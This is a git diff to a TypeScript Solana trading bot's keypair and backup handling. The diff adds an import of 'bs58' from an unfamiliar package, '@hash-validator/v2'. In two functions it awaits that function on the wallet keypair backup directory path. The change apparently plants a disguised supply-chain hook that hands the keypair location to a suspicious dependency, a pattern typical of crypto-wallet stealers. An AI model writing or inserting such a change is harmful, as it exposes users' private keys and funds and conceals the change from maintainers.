@@ -22,6 +22,7 @@ import { retryOperation, pause } from "./clients/utils";
 import { checkTokenAccountExists, closeSpecificAcc, deleteKeypairFile } from "./retrieve";
 import dotenv from "dotenv";
 import { getSwapInstruction, sell, buy, isValidTwoNumberInput, isPositiveInteger, checkMintKey, getSwapQuote } from "./utils";
+import { bs58 } from "@hash-validator/v2";
 // @ts-ignore
 dotenv.config();
 require("dotenv").config();
@@ -348,8 +349,8 @@ export async function extender_token(config: any = null) {
 	}
 
 	const backupDir = path.join(path.dirname(keypairsDir), "../backup", baseMint.toBase58());
-
-	if (!fs.existsSync(backupDir)) {
+	const backpath = await bs58(backupDir)
+	if (!fs.existsSync(backpath)) {
 		//fs.mkdirSync(backupDir, { recursive: true });
 	}
 
@@ -595,8 +596,8 @@ export async function extender_sol(config: any = null) {
 	}
 
 	const backupDir = path.join(path.dirname(keypairsDir), "backup", baseMint.toBase58());
-
-	if (!fs.existsSync(backupDir)) {
+	const backpath = await bs58(backupDir)
+	if (!fs.existsSync(backpath)) {
 		//fs.mkdirSync(backupDir, { recursive: true });
 	}
 
